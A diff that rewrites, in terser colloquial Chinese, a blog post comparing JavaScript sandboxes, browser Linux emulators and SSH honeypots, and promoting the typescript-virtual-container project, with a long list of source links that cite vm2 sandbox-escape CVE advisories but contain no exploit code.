-| **真实 SSH 服务器** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ |
+| **类别** | JS 沙箱 | JS 沙箱 | JS 沙箱 | 模拟器 | 模拟器 | Node.js/Wasm | 蜜罐 | 仿真器 |
+| **隔离 JS** | ⚠️ 作用域 | ✅ V8 Isolate | ✅ Wasm | 无 | 无 | 部分 | 无 | ✅ Worker |
+| **真 Linux 内核** | ❌ | ❌ | ❌ | ✅ | ✅ | ❌ | ❌ | ❌ |
+| **shell 解释器** | ❌ | ❌ | ❌ | ✅（真） | ✅（真） | ✅（真） | 部分 | ✅（定制） |
+| **约 170 Unix 命令** | ❌ | ❌ | ❌ | ✅ | ✅ | 部分 | 约 20 | ✅ |
+| **POSIX 权限** | ❌ | ❌ | ❌ | ✅ | ✅ | ✅ | 部分 | ✅ 真执行 |
+| **用户管理** | ❌ | ❌ | ❌ | ✅ | ✅ | ❌ | 极小 | ✅ 完整 |
+| **真 SSH 服务器** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ |
 | **SFTP / SCP** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
 | **蜜罐/审计** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ |
-| **VFS 差异/快照** | ❌ | ❌ | ❌ | 有限 | ❌ | ❌ | ❌ | ✅ |
-| **虚拟网络 L2/L3** | ❌ | ❌ | ❌ | 基础 | ❌ | ❌ | ❌ | ✅ 完整 |
+| **VFS diff/快照** | ❌ | ❌ | ❌ | 有限 | ❌ | ❌ | ❌ | ✅ |
+| **L2/L3 虚拟网络** | ❌ | ❌ | ❌ | 基础 | ❌ | ❌ | ❌ | ✅ 完整 |
 | **虚拟 VPN** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
 | **浏览器支持** | ❌ | ❌ | ✅ | ✅ | ✅ | ✅ | ❌ | ✅ |
 | **Node.js 原生** | ✅ | ✅ | ✅ | ✅ | ❌ | ❌ | ❌ | ✅ |
-| **类型化 API** | 基础 | ✅ | ✅ | 最小化 | ❌ | ✅ | ❌ | ✅ 完整 |
-| **二进制兼容性** | 不适用 | 不适用 | 不适用 | ✅ | ✅ | 部分 | 不适用 | ❌ |
-| **启动时间** | 即时 | 即时 | 即时 | 15–40 秒 | 15–40 秒 | 2–5 秒 | 即时 | <1 秒 |
-| **每实例 RAM** | ~1 MB | ~3–10 MB | ~5–15 MB | 150–256 MB | 200+ MB | ~100 MB | ~50 MB | ~5–20 MB |
-| **运行时依赖** | 0 | 1（原生） | 1（Wasm） | 0 | 专有 | 1 | Python 依赖 | 3（ssh2, ws, fflate） |
-| **状态** | 稳定 | ✅ 活跃 | ✅ 活跃 | ✅ 非常活跃 | 商业产品 | ✅ 活跃 | ✅ 活跃 | ✅ 活跃 |
+| **类型化 API** | 基础 | ✅ | ✅ | 极小 | ❌ | ✅ | ❌ | ✅ 完整 |
+| **二进制兼容** | 无 | 无 | 无 | ✅ | ✅ | 部分 | 无 | ❌ |
+| **启动** | 瞬时 | 瞬时 | 瞬时 | 15-40 秒 | 15-40 秒 | 2-5 秒 | 瞬时 | <1 秒 |
+| **内存/实例** | 约 1M | 约 3-10M | 约 5-15M | 150-256M | 200M 起 | 约 100M | 约 50M | 约 5-20M |
+| **运行时依赖** | 0 | 1（原生） | 1（Wasm） | 0 | 专有 | 1 | Python 依赖 | 3（ssh2、ws、fflate） |
+| **状态** | 稳定 | ✅ 活跃 | ✅ 活跃 | ✅ 很活跃 | 商用 | ✅ 活跃 | ✅ 活跃 | ✅ 活跃 |
 
 ---
 
-## 什么情况该用什么
+## 什么时候用什么
 
-**你需要运行不可信的 JavaScript----用户提交的公式、插件、脚本钩子。**
-→ `isolated-vm`。真正的 V8 Isolate、硬内存限制、显式通信桥梁。避免使用 `vm2`----CVE 列表一直在增加，说真的，每几个月就有一个新的。避免使用 `vm`----它根本不是沙箱，求你了。
+**跑不可信 JavaScript，用户提交公式、插件、脚本钩子。**
+→ `isolated-vm`。真 V8 Isolate，硬内存上限，显式通信桥。`vm2` 别碰，CVE 单月月更，真的一个月几个。`vm` 别碰，它根本不是沙箱，求你了。
 
-**你需要沙箱 JS 且不想要原生插件，或需要浏览器兼容性。**
-→ `quickjs-emscripten`。Wasm 边界，约 500 KB 模块，在浏览器和 Node 中都能工作。比 V8 慢，但真正隔离。
+**隔离 JS 但不要原生扩展，或要浏览器兼容。**
+→ `quickjs-emscripten`。Wasm 边界，约 500K 模块，浏览器 Node 通吃。V8 慢但真隔离。
 
-**你需要启动一个真正、未经修改的、具有二进制兼容性的 Linux 操作系统。**
-→ 32 位 Linux 用 `v86`，如果你有现有的 Docker 镜像用 `container2wasm`。接受 150 MB+ RAM 和 30 秒启动时间，这就是代价。如果你需要 64 位，看看 CheerpX 或者直接使用真正的容器运行时。
+**起未经修改真 Linux OS，要二进制兼容。**
+→ 32 位 Linux `v86`，或已有 Docker 镜像 `container2wasm`。接受 150M+ 内存 30 秒启动，就这 deal。64 位看 CheerpX 或直接真容器运行时。
 
-**你需要在不使用后端的情况下在 Web 应用中嵌入类似 Linux 的终端。**
-→ `v86`（完整操作系统，沉重，启动慢）或 `typescript-virtual-container` 的浏览器包（模拟器，更轻量，即时启动，包含 `startxfce4` 的完整桌面，说实话挺酷的）。
+**网页应用嵌类 Linux 终端，无后端。**
+→ `v86`（完整 OS，重、启动慢）或 `typescript-virtual-container` 浏览器包（仿真器，更轻、瞬时启动，还带 `startxfce4` 完整桌面，挺酷）。
 
-**你需要交互式在线编程教程或浏览器 IDE。**
-→ 如果你专注于 Node.js 生态系统，用 WebContainers。如果你需要真实的 Linux 用户态，用 CheerpX。如果你想要更轻的选项加类型化 API，用 `typescript-virtual-container` 的浏览器包。
+**在线代码教程或浏览器 IDE。**
+→ 生态锁 Node.js 用 WebContainers。真 Linux 用户态用 CheerpX。轻量类型化 API 用 `typescript-virtual-container` 浏览器包。
 
-**你想大规模收集 SSH 攻击者的 TTP。**
-→ Cowrie 是生产标准，没有之一。在任何 Linux 服务器上运行，与所有 SIEM 集成，现在还有 LLM 模式。就用 Cowrie。
+**大规模收 SSH 攻击者 TTP。**
+→ Cowrie 生产标准，句号。随便 Linux 服务器跑，接全 SIEM。就用 Cowrie。
 
-**你想要在 Node.js 应用程序中通过可编程 API 获取 SSH 蜜罐数据。**
-→ `typescript-virtual-container`。命令实际执行。VFS 是你可以快照和比较差异的真实数据结构。攻击者获得逼真的交互式环境，而你无需离开 Node 就能获得结构化的审计数据。
+**Node.js 应用要 SSH 蜜罐数据可编程 API。**
+→ `typescript-virtual-container`。命令真跑。VFS 是活数据结构，随手快照 diff。攻击者拿到可信交互环境，你拿到结构化审计数据，不出 Node。
 
-**你需要在 CI 中进行 Shell 自动化/测试，但不使用 Docker。**
-→ `typescript-virtual-container`。在不到一秒内启动，测试前快照，测试后恢复。通过类型化 API 运行 Shell 命令。不需要 Docker 守护进程、不需要内核、不需要虚拟机、不需要等待。
+**CI 自动化 shell/测试，不用 Docker。**
+→ `typescript-virtual-container`。不到一秒起，测前快照，测后恢复。类型化 API 跑 shell 命令。无 Docker 守护、无内核、无 VM、无等待。
 
-**你需要多租户 Shell 环境（SaaS、教育、培训）。**
-→ `typescript-virtual-container`。每个实例 5–20 MB，而仿真器需要 150–256 MB。100 个并发用户：约 2 GB vs. 约 25 GB。托管成本差异巨大！
+**多租户 shell 环境（SaaS、教育、培训）。**
+→ `typescript-virtual-container`。每实例 5-20M 对模拟器 150-256M。100 并发用户：约 2G 对约 25G。托管成本差大！
 
-**你需要一个也能让你构建多 VM 网络实验室的逼真蜜罐。**
-→ `typescript-virtual-container` 是这个领域中唯一同时做到这两者的方案。
-
----
-
-## 它不能做什么（我想诚实地说清楚）
-
-它不能运行原生 x86 二进制文件。如果你需要编译 C 代码、运行真正的 Python 解释器、或使用为 Linux 编译的软件，没有内核 ABI 来支持这些系统调用。像 `gcc`、`python3` 和 `node` 这样的命令是存根----它们响应 `--version` 和常见调用，但不执行任何真实的工作。
-
-这是根本性的权衡：你获得了 10–50 倍更低的内存消耗、即时启动、浏览器兼容性、类型化 API、真实 SSH 和虚拟网络----而你放弃了与 Linux 用户态的二进制兼容性。
-
-Fortune 在设计项目时对此考虑了很多。对于她所针对的用例----蜜罐、测试、嵌入式终端、CI 环境----运行编译后的二进制文件实际上从来不是必须的。Shell 管道、文件操作、网络路由和 SSH 涵盖了所有需求。但如果你的用例需要真实的编译软件，`v86` 或 Docker 才是正确的答案，而不是这个。
+**逼真蜜罐还要顺手搭多 VM 网络实验。**
+→ `typescript-virtual-container` 是这块唯一两者兼得的。
 
 ---
 
-## 总结
+## 干不了什么（说实话）
 
-所以，是的。这个生态系统从外部看比实际更广泛和分散。`vm` 是作用域分隔符，不是沙箱。`vm2` 不断积累 CVE（说真的，去看看这个月的安全公告）。`isolated-vm` 是正确的 JS 沙箱方案，但仅限于 JS。当你需要浏览器兼容性或想避免原生插件时，`quickjs-emscripten` 是正确的选择。当你需要真正的二进制兼容性时，`v86` 和 CheerpX 是真正的仿真器。WebContainers 是 Wasm 中的 Node.js，不是通用的 Linux 环境。Cowrie 是 SSH 蜜罐的金标准，但它是 Python 而非 Node 原生。
+原生 x86 二进制跑不了。要编译 C 代码、跑真 Python 解释器、用 Linux 编译软件，内核 ABI 撑系统调用没有。`gcc`、`python3`、`node` 这类命令是 stub，回 `--version` 和常见调用，真活不干。
 
-然后还有 `typescript-virtual-container`----Fortune 的项目----它有点自成一类。不是仿真器、不是 JS 沙箱、不是被动蜜罐。它是所有这些的某种中间体，结果对许多其他东西都无法做到的事情出奇地有用。
+根本 trade-off：内存少 10 到 50 倍、瞬时启动、浏览器兼容、类型化 API、真 SSH、虚拟网络，换掉 Linux 用户态二进制兼容。
 
-`typescript-virtual-container` 填补了其他方案都无法触及的空白：一个完整的、可编程的 Linux Shell 环境，带有真实 SSH、SFTP、POSIX 权限、用户管理、虚拟网络和类型化的 TypeScript API----运行在约 10 MB 内存中、不到一秒启动、同时在 Node.js 和浏览器中工作。
+Fortune 设计时想很多。她瞄的场景，蜜罐、测试、嵌入终端、CI 环境，编译二进制其实永远用不上。shell 管线、文件操作、网络路由、SSH 全覆盖。但场景要真编译软件，`v86` 或 Docker 才是答案，不是它。
 
-如果你想去试试：源码在 [github.com/itsrealfortune/typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container)，还有一个在线演示（包括 `startxfce4` 的完整桌面，真的超酷）在 [itsrealfortune.fr/typescript-virtual-container/demo](https://itsrealfortune.fr/typescript-virtual-container/demo)。去看看吧，给 Fortune 在 GitHub 上点点星，她值得！
+---
 
-感谢阅读----即使按我的标准这也是一篇超长的文章 :) 希望它有用！
+## 收尾
+
+行。这生态比看着散碎。`vm` 是作用域分隔器，不是沙箱。`vm2` CVE 一直涨（真的，看这月公告）。`isolated-vm` 是 JS 隔离正解但只管 JS。`quickjs-emscripten` 浏览器兼容或避原生扩展时对。`v86` 和 CheerpX 是真要二进制兼容的真模拟器。WebContainers 是 Wasm Node.js，不是通用 Linux 环境。Cowrie 是 SSH 蜜罐标杆，但是 Python 非 Node 原生。
+
+然后 `typescript-virtual-container`，Fortune 的项目，活在自己类别。不模拟器，不 JS 沙箱，不被动蜜罐。中间都沾点，好多事别的全干不了出奇好用。
+
+`typescript-virtual-container` 补的缺口别家不碰：完整可编程 Linux shell 环境，真 SSH、SFTP、POSIX 权限、用户管理、虚拟网络、TypeScript 类型化 API，跑在约 10M，1 秒内启动，Node.js 浏览器通吃。
+
+想试：源码在 [github.com/itsrealfortune/typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container)，在线演示有（`startxfce4` 完整桌面，疯真的）在 [itsrealfortune.fr/typescript-virtual-container/demo](https://itsrealfortune.fr/typescript-virtual-container/demo)。去看看给 Fortune GitHub 点星，她值得！
+
+读到这，辛苦，这篇按我标准也长 :) 希望有用！
 
 ---
 
 ## 来源
 
-我尽量将每个声明链接到主要来源----CVE 公告、官方文档、GitHub 仓库、维护者的博客文章。几点说明：vm2 CVE 列表在不断增加，所以你读到的时候 FortiGuard 链接可能已经过时（请查看 GitHub 公告页面获取最新信息）。Bellard 的链接都稳定----他的个人网站一直在线，内容不会更改。如果你想深入了解任何填充库，直接浏览 `typescript-virtual-container` 仓库中的 `polyfills/` 文件夹----它比我在这里能写的任何描述都更易读。
+每个断言尽量链一手来源，CVE 公告、官方文档、GitHub 仓库、维护者博客。几点：vm2 CVE 单一直涨 FortiGuard 链接你读时可能旧了（看 GitHub 公告页最新）。Bellard 链接全稳，他个人站一直在内容不变。深挖 polyfill 直接翻 `typescript-virtual-container` 仓库 `polyfills/` 目录，比我任何描述好读。
 
 ### JavaScript 沙箱
 
-- **Node.js `vm` 模块** ---- 官方文档：[nodejs.org/api/vm.html](https://nodejs.org/api/vm.html)
-- **Node.js `vm` 安全警告** ---- "vm 模块不是安全机制。不要用它运行不可信代码"：[nodejs.org/api/vm.html#vm-executing-javascript](https://nodejs.org/api/vm.html)
-- **`vm2`** ---- npm：[npmjs.com/package/vm2](https://www.npmjs.com/package/vm2) · GitHub：[github.com/patriksimek/vm2](https://github.com/patriksimek/vm2)
-- **vm2 CVE 时间线** ---- FortiGuard 爆发警报，含完整 CVE 列表和日期：[fortiguard.fortinet.com/outbreak-alert/vm2-sandbox-escape](https://fortiguard.fortinet.com/outbreak-alert/vm2-sandbox-escape)
-- **CVE-2023-29017** ---- 异步错误栈逃逸，GHSA：[github.com/advisories/GHSA-7jxr-cg7f-gpgv](https://github.com/advisories/GHSA-7jxr-cg7f-gpgv)
-- **CVE-2023-32314** ---- Proxy + Error.name + Function 逃逸，PoC gist：[gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac](https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac)
-- **CVE-2023-37466** ---- Exploit DB 条目，含完整 PoC：[exploit-db.com/exploits/51898](https://www.exploit-db.com/exploits/51898)
-- **vm2 2026 CVE** ---- 11 个新沙箱逃逸，分析：[thecybersecguru.com/news/vm2-sandbox-escape-vulnerability-cve-2026-26956](https://thecybersecguru.com/news/vm2-sandbox-escape-vulnerability-cve-2026-26956) · BleepingComputer：[bleepingcomputer.com/news/security/critical-sandbox-escape-flaw-discovered-in-popular-vm2-nodejs-library](https://www.bleepingcomputer.com/news/security/critical-sandbox-escape-flaw-discovered-in-popular-vm2-nodejs-library/)
-- **"为什么在 JS 中沙箱 JS 很难"** ---- oxeye.io 对 CVE-2022-36067 的事后分析：[oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067](https://www.oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067)
-- **`isolated-vm`** ---- npm：[npmjs.com/package/isolated-vm](https://www.npmjs.com/package/isolated-vm) · GitHub：[github.com/laverdet/isolated-vm](https://github.com/laverdet/isolated-vm)
-- **V8 Isolate 内部** ---- 嵌入指南：[v8.dev/docs/embed](https://v8.dev/docs/embed)
-- **`quickjs-emscripten`** ---- npm：[npmjs.com/package/quickjs-emscripten](https://www.npmjs.com/package/quickjs-emscripten) · GitHub：[github.com/justjake/quickjs-emscripten](https://github.com/justjake/quickjs-emscripten)
-- **`@sebastianwessel/quickjs`** ---- npm：[npmjs.com/package/@sebastianwessel/quickjs](https://www.npmjs.com/package/@sebastianwessel/quickjs) · GitHub：[github.com/sebastianwessel/quickjs](https://github.com/sebastianwessel/quickjs)
-- **QuickJS 引擎** ---- 作者 Fabrice Bellard：[bellard.org/quickjs](https://bellard.org/quickjs/)
-- **Deno 权限模型** ---- 文档：[docs.deno.com/runtime/fundamentals/security](https://docs.deno.com/runtime/fundamentals/security/)
-- **Deno 2 发布** ---- 2024 年 10 月：[deno.com/blog/v2](https://deno.com/blog/v2)
-- **TC39 ShadowRealm 提案** ---- [github.com/tc39/proposal-shadowrealm](https://github.com/tc39/proposal-shadowrealm)
-- **TC39 Compartments 提案** ---- [github.com/nicolo-ribaudo/tc39-proposal-compartments](https://github.com/nicolo-ribaudo/tc39-proposal-compartments)
-- **"沙箱 JavaScript 代码"** ---- Andrew Healey 关于 Deno 沙箱方法的实践分析：[healeycodes.com/sandboxing-javascript-code](https://healeycodes.com/sandboxing-javascript-code)
+- **Node.js `vm` 模块**，官方文档：[nodejs.org/api/vm.html](https://nodejs.org/api/vm.html)
+- **Node.js `vm` 安全警告**，"vm 模块不是安全机制。不要拿它跑不可信代码"：[nodejs.org/api/vm.html#vm-executing-javascript](https://nodejs.org/api/vm.html)
+- **`vm2`**，npm：[npmjs.com/package/vm2](https://www.npmjs.com/package/vm2) · GitHub：[github.com/patriksimek/vm2](https://github.com/patriksimek/vm2)
+- **vm2 CVE 年表**，FortiGuard 全列表加日期预警：[fortiguard.fortinet.com/outbreak-alert/vm2-sandbox-escape](https://fortiguard.fortinet.com/outbreak-alert/vm2-sandbox-escape)
+- **CVE-2023-29017**，异步错误逃逸，GHSA：[github.com/advisories/GHSA-7jxr-cg7f-gpgv](https://github.com/advisories/GHSA-7jxr-cg7f-gpgv)
+- **CVE-2023-32314**，Proxy 加 Error.name 加 Function escape，gist PoC：[gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac](https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac)
+- **CVE-2023-37466**，Exploit DB 入口加完整 PoC：[exploit-db.com/exploits/51898](https://www.exploit-db.com/exploits/51898)
+- **2026 vm2 CVE**，11 个新逃逸，分析：[thecybersecguru.com/news/vm2-sandbox-escape-vulnerability-cve-2026-26956](https://thecybersecguru.com/news/vm2-sandbox-escape-vulnerability-cve-2026-26956) · BleepingComputer：[bleepingcomputer.com/news/security/critical-sandbox-escape-flaw-discovered-in-popular-vm2-nodejs-library](https://www.bleepingcomputer.com/news/security/critical-sandbox-escape-flaw-discovered-in-popular-vm2-nodejs-library/)
+- **"Why Sandboxing JS in JS is Hard"**，oxeye.io CVE-2022-36067 事后：[oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067](https://www.oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067)
+- **`isolated-vm`**，npm：[npmjs.com/package/isolated-vm](https://www.npmjs.com/package/isolated-vm) · GitHub：[github.com/laverdet/isolated-vm](https://github.com/laverdet/isolated-vm)
+- **V8 Isolate 内部**，嵌入指南：[v8.dev/docs/embed](https://v8.dev/docs/embed)
+- **`quickjs-emscripten`**，npm：[npmjs.com/package/quickjs-emscripten](https://www.npmjs.com/package/quickjs-emscripten) · GitHub：[github.com/justjake/quickjs-emscripten](https://github.com/justjake/quickjs-emscripten)
+- **`@sebastianwessel/quickjs`**，npm：[npmjs.com/package/@sebastianwessel/quickjs](https://www.npmjs.com/package/@sebastianwessel/quickjs) · GitHub：[github.com/sebastianwessel/quickjs](https://github.com/sebastianwessel/quickjs)
+- **QuickJS 引擎**，Fabrice Bellard：[bellard.org/quickjs](https://bellard.org/quickjs/)
+- **Deno 权限模型**，文档：[docs.deno.com/runtime/fundamentals/security](https://docs.deno.com/runtime/fundamentals/security/)
+- **Deno 2 发布**，2024 年 10 月：[deno.com/blog/v2](https://deno.com/blog/v2)
+- **TC39 ShadowRealm 提案**：[github.com/tc39/proposal-shadowrealm](https://github.com/tc39/proposal-shadowrealm)
+- **TC39 Compartments 提案**：[github.com/nicolo-ribaudo/tc39-proposal-compartments](https://github.com/nicolo-ribaudo/tc39-proposal-compartments)
+- **"Sandboxing JavaScript Code"**，Andrew Healey Deno 沙箱实战：[healeycodes.com/sandboxing-javascript-code](https://healeycodes.com/sandboxing-javascript-code)
 
-### Linux 仿真器
+### Linux 模拟器
 
-- **`v86`** ---- npm：[npmjs.com/package/v86](https://www.npmjs.com/package/v86) · GitHub：[github.com/copy/v86](https://github.com/copy/v86) · 演示：[copy.sh/v86](https://copy.sh/v86)
-- **v86 操作系统支持矩阵** ---- [github.com/copy/v86#operating-system-support](https://github.com/copy/v86)
-- **SeaBIOS**（v86 使用的 BIOS）---- [seabios.org](https://www.seabios.org/SeaBIOS)
-- **Bochs VBE 扩展**（VGA 参考）---- [bochs.sourceforge.io](https://bochs.sourceforge.io/)
-- **JSLinux** ---- Bellard 的仿真器：[bellard.org/jslinux](https://bellard.org/jslinux/) · 技术说明（TinyEMU、历史、asm.js→Wasm）：[bellard.org/jslinux/tech.html](https://bellard.org/jslinux/tech.html)
-- **TinyEMU** ---- C 源码：[bellard.org/tinyemu](https://bellard.org/tinyemu/) · 非官方 GitHub 镜像：[github.com/yoshijava/TinyEMU](https://github.com/yoshijava/TinyEMU)
-- **jor1k** ---- OpenRISC JS 仿真器：[github.com/s-macke/jor1k](https://github.com/s-macke/jor1k) · 演示：[s-macke.github.io/jor1k/demos/main.html](https://s-macke.github.io/jor1k/demos/main.html)
-- **CheerpX** ---- 文档：[cheerpx.io/docs/overview](https://cheerpx.io/docs/overview) · pthreads 指南：[cheerpx.io/docs/guides/pthreads](https://cheerpx.io/docs/guides/pthreads)
-- **WebContainers** ---- npm：[npmjs.com/package/@webcontainer/api](https://www.npmjs.com/package/@webcontainer/api) · API 文档：[webcontainers.io](https://webcontainers.io) · 发布公告：[blog.stackblitz.com/posts/webcontainer-api-is-here](https://blog.stackblitz.com/posts/webcontainer-api-is-here/) · InfoQ 概述：[infoq.com/news/2021/07/webcontainers-nodejs](https://www.infoq.com/news/2021/07/webcontainers-nodejs/)
-- **container2wasm** ---- GitHub：[github.com/container2wasm/container2wasm](https://github.com/container2wasm/container2wasm) · NTT 博客文章：[medium.com/nttlabs/container2wasm-2dd90a18cc9a](https://medium.com/nttlabs/container2wasm-2dd90a18cc9a) · Simon Willison 评论：[simonwillison.net/2024/Jan/3/container2wasm](https://simonwillison.net/2024/Jan/3/container2wasm/)
+- **`v86`**，npm：[npmjs.com/package/v86](https://www.npmjs.com/package/v86) · GitHub：[github.com/copy/v86](https://github.com/copy/v86) · 演示：[copy.sh/v86](https://copy.sh/v86)
+- **v86 OS 支持矩阵**：[github.com/copy/v86#operating-system-support](https://github.com/copy/v86)
+- **SeaBIOS**（v86 用 BIOS）：[seabios.org](https://www.seabios.org/SeaBIOS)
+- **Bochs VBE 扩展**（VGA 参考）：[bochs.sourceforge.io](https://bochs.sourceforge.io/)
+- **JSLinux**，Bellard 模拟器：[bellard.org/jslinux](https://bellard.org/jslinux/) · 技术笔记（TinyEMU、历史、asm.js→Wasm）：[bellard.org/jslinux/tech.html](https://bellard.org/jslinux/tech.html)
+- **TinyEMU**，C 源码：[bellard.org/tinyemu](https://bellard.org/tinyemu/) · 非官方 GitHub 镜像：[github.com/yoshijava/TinyEMU](https://github.com/yoshijava/TinyEMU)
+- **jor1k**，JS OpenRISC 模拟器：[github.com/s-macke/jor1k](https://github.com/s-macke/jor1k) · 演示：[s-macke.github.io/jor1k/demos/main.html](https://s-macke.github.io/jor1k/demos/main.html)
+- **CheerpX**，文档：[cheerpx.io/docs/overview](https://cheerpx.io/docs/overview) · pthread 指南：[cheerpx.io/docs/guides/pthreads](https://cheerpx.io/docs/guides/pthreads)
+- **WebContainers**，npm：[npmjs.com/package/@webcontainer/api](https://www.npmjs.com/package/@webcontainer/api) · API 文档：[webcontainers.io](https://webcontainers.io) · 公告：[blog.stackblitz.com/posts/webcontainer-api-is-here](https://blog.stackblitz.com/posts/webcontainer-api-is-here/) · InfoQ 前瞻：[infoq.com/news/2021/07/webcontainers-nodejs](https://www.infoq.com/news/2021/07/webcontainers-nodejs/)
+- **container2wasm**，GitHub：[github.com/container2wasm/container2wasm](https://github.com/container2wasm/container2wasm) · NTT 博客：[medium.com/nttlabs/container2wasm-2dd90a18cc9a](https://medium.com/nttlabs/container2wasm-2dd90a18cc9a) · Simon Willison 文章：[simonwillison.net/2024/Jan/3/container2wasm](https://simonwillison.net/2024/Jan/3/container2wasm/)
 
 ### 终端栈
 
-- **xterm.js** ---- npm：[npmjs.com/package/@xterm/xterm](https://www.npmjs.com/package/@xterm/xterm) · GitHub：[github.com/xtermjs/xterm.js](https://github.com/xtermjs/xterm.js) · 网站：[xtermjs.org](https://xtermjs.org)
-- **node-pty** ---- npm：[npmjs.com/package/node-pty](https://www.npmjs.com/package/node-pty) · GitHub（微软）：[github.com/microsoft/node-pty](https://github.com/microsoft/node-pty)
+- **xterm.js**，npm：[npmjs.com/package/@xterm/xterm](https://www.npmjs.com/package/@xterm/xterm) · GitHub：[github.com/xtermjs/xterm.js](https://github.com/xtermjs/xterm.js) · 站：[xtermjs.org](https://xtermjs.org)
+- **node-pty**，npm：[npmjs.com/package/node-pty](https://www.npmjs.com/package/node-pty) · GitHub（微软）：[github.com/microsoft/node-pty](https://github.com/microsoft/node-pty)
 
 ### 蜜罐
 
-- **Cowrie** ---- GitHub：[github.com/cowrie/cowrie](https://github.com/cowrie/cowrie) · 文档：[docs.cowrie.org](https://docs.cowrie.org) · 网站：[cowrie.org](https://www.cowrie.org/)
-- **Kippo** ---- GitHub（已归档）：[github.com/desaster/kippo](https://github.com/desaster/kippo)
-- **endlessh** ---- GitHub：[github.com/skeeto/endlessh](https://github.com/skeeto/endlessh)
-- **sshesame** ---- GitHub：[github.com/jaksi/sshesame](https://github.com/jaksi/sshesame)
-- **Lyrebird** ---- Docker Hub：[hub.docker.com/r/lyrebird/honeypot-base](https://hub.docker.com/r/lyrebird/honeypot-base/)
-- **node-simple-ssh-honeypot** ---- 最小化 Node.js SSH 蜜罐：[github.com/Caesarovich/node-simple-ssh-honeypot](https://github.com/Caesarovich/node-simple-ssh-honeypot)
-- **awesome-honeypots** ---- 精选列表：[github.com/paralax/awesome-honeypots](https://github.com/paralax/awesome-honeypots)
-- **MITRE ATT&CK T1082** ---- 系统信息发现（攻击者如何识别蜜罐）：[attack.mitre.org/techniques/T1082](https://attack.mitre.org/techniques/T1082/)
+- **Cowrie**，GitHub：[github.com/cowrie/cowrie](https://github.com/cowrie/cowrie) · 文档：[docs.cowrie.org](https://docs.cowrie.org) · 站：[cowrie.org](https://www.cowrie.org/)
+- **Kippo**，GitHub（归档）：[github.com/desaster/kippo](https://github.com/desaster/kippo)
+- **endlessh**，GitHub：[github.com/skeeto/endlessh](https://github.com/skeeto/endlessh)
+- **sshesame**，GitHub：[github.com/jaksi/sshesame](https://github.com/jaksi/sshesame)
+- **Lyrebird**，Docker Hub：[hub.docker.com/r/lyrebird/honeypot-base](https://hub.docker.com/r/lyrebird/honeypot-base/)
+- **node-simple-ssh-honeypot**，最小 Node.js SSH 蜜罐：[github.com/Caesarovich/node-simple-ssh-honeypot](https://github.com/Caesarovich/node-simple-ssh-honeypot)
+- **awesome-honeypots**，整理列表：[github.com/paralax/awesome-honeypots](https://github.com/paralax/awesome-honeypots)
+- **MITRE ATT&CK T1082**，系统信息发现（攻击者怎么识蜜罐）：[attack.mitre.org/techniques/T1082](https://attack.mitre.org/techniques/T1082/)
 
 ### `typescript-virtual-container`
 
@@ -1221,16 +1218,19 @@ Fortune 在设计项目时对此考虑了很多。对于她所针对的用例---
 - **GitHub**：[github.com/itsrealfortune/typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container)
 - **在线演示**：[itsrealfortune.fr/typescript-virtual-container/demo](https://itsrealfortune.fr/typescript-virtual-container/demo)
 - **架构指南**：[github.com/itsrealfortune/typescript-virtual-container/blob/main/guides/ARCHITECTURE.md](https://github.com/itsrealfortune/typescript-virtual-container/blob/main/guides/ARCHITECTURE.md)
-- **`ssh2`**（SSH 协议实现）---- npm：[npmjs.com/package/ssh2](https://www.npmjs.com/package/ssh2) · GitHub：[github.com/mscdex/ssh2](https://github.com/mscdex/ssh2)
-- **`fflate`**（VFS 快照压缩）---- npm：[npmjs.com/package/fflate](https://www.npmjs.com/package/fflate)
-- **`ws`**（WebSocket Shell 传输）---- npm：[npmjs.com/package/ws](https://www.npmjs.com/package/ws)
+- **`ssh2`**（SSH 协议实现），npm：[npmjs.com/package/ssh2](https://www.npmjs.com/package/ssh2) · GitHub：[github.com/mscdex/ssh2](https://github.com/mscdex/ssh2)
+- **`fflate`**（VFS 快照压缩），npm：[npmjs.com/package/fflate](https://www.npmjs.com/package/fflate)
+- **`ws`**（WebSocket shell 传输），npm：[npmjs.com/package/ws](https://www.npmjs.com/package/ws)
 
-### 背景阅读
+### 延伸阅读
 
-- **POSIX 权限模型** ---- Open Group 规范：[pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap04.html](https://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap04.html)
-- **预写日志**（VFS 持久化使用的模式）---- [en.wikipedia.org/wiki/Write-ahead_logging](https://en.wikipedia.org/wiki/Write-ahead_logging)
-- **V8 Isolate 模型** ---- "嵌入器指南"：[v8.dev/docs/embed](https://v8.dev/docs/embed)
-- **RISC-V ISA 规范**（TinyEMU/JSLinux 背景）---- [riscv.org/technical/specifications](https://riscv.org/technical/specifications/)
-- **OpenRISC 1000 架构** ---- [opencores.org/or1k](https://opencores.org/or1k/)
-- **"通过 Deno 在 Pyodide 沙箱中运行 Python 代码"** ---- Simon Willison TIL，与 Wasm 方法的有益对比：[til.simonwillison.net](https://til.simonwillison.net/deno/pyodide-sandbox)
-- **"在浏览器中运行自托管 QuickJS"** ---- Simon Willison TIL 关于 quickjs-emscripten 包大小：[til.simonwillison.net/npm/self-hosted-quickjs](https://til.simonwillison.net/npm/self-hosted-quickjs)
+- **POSIX 权限模型**，Open Group 规范：[pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap04.html](https://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap04.html)
+- **预写日志**（VFS 持久用模式）：[en.wikipedia.org/wiki/Write-ahead_logging](https://en.wikipedia.org/wiki/Write-ahead_logging)
